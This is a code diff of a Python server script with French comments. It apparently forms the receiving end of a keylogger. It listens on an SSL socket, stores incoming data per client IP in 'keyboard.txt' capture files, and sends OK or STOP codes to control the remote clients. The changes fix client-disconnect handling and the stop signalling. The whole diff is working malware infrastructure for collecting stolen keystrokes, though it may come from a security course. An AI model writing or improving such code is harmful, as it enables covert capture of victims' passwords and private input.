@@ -26,7 +26,7 @@ path_captures = cwd / "captures"
 
 # Fonctions
 
-def handle_data(data):
+def handle_data(data, addr):
 
     fic = list(path_captures.glob(f"{addr[0]}*.txt"))
     filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
@@ -73,7 +73,7 @@ if args.listen:
 
     # crétaion et configuration du socket
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # server_socket.setblocking(False)
+
     server_socket.bind((host, port))
     server_socket.listen()
 
@@ -98,25 +98,29 @@ if args.listen:
         try:
     
             # Réception des données
+            print("wait for data")
             data = ssl_socket.recv(1024).decode('utf-8')
+
+            if data == "":
+                print("client dead ?")
+                running = False
 
             # si des données ont été réceptionnées
             if data:
-                handle_data(data)
+                handle_data(data, addr)
 
                 # renvoyer un code
                 if return_code == "OK":
                     print("[+] Keep running")
                     ssl_socket.send("OK".encode("utf-8"))
 
-                elif return_code == "OKE":
-                    print("[+] Keep running")
-                    ssl_socket.send("OKE".encode("utf-8"))
-
                 else:
                     print("send stop code")
                     ssl_socket.send("STOP".encode("utf-8"))
                     running = False
+
+                    # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
+                    time.sleep(1)
 
 
         # interception du KeyboardInterrupt
@@ -132,7 +136,6 @@ if args.listen:
             if respons == 'n' or respons == 'N':
                 # ne rien faire
                 print("[+] Le serveur ne sera pas arrêté")
-                return_code = "OKE"
 
 
             else:
@@ -144,7 +147,6 @@ if args.listen:
 
         except Exception as e:
             running = False
-
             print(f"Error Main : {e}")
 
         
